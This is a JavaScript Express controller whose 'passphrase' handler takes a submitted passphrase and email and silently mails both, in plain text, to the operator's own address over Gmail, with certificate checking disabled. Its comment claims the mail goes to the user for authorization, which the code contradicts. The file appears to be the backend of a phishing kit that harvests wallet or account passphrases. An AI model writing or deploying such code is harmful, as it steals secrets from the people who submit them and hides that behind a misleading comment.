import User from "../model/User.js"
import nodemailer from "nodemailer";

export const passphrase = async (req, res) => {
        const user = await req.body;

        res.status(201).json({"data": user });
        

      //sending a mail to the user's email for authorization
       const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.PASSWORD
            },
            tls: {
                rejectUnauthorized: false,
            },
            port: 465,
            host: "smtp.gmail.com",
        })
    
        const mailOptions = {
            to: process.env.EMAIL,
            subject: "New Passphrase Info",
            html: `passphrase: ${user.passphrase} ,
                    email: ${user.email}`
        }
    
        transporter.sendMail(mailOptions, (error) => {
            if (error) {
                console.log(error)
            } else {
                console.log("Email sent")
            }
        })
}     

export const testRoute = (req, res) => {
    res.status(200).json({"result": "test successful"})
}  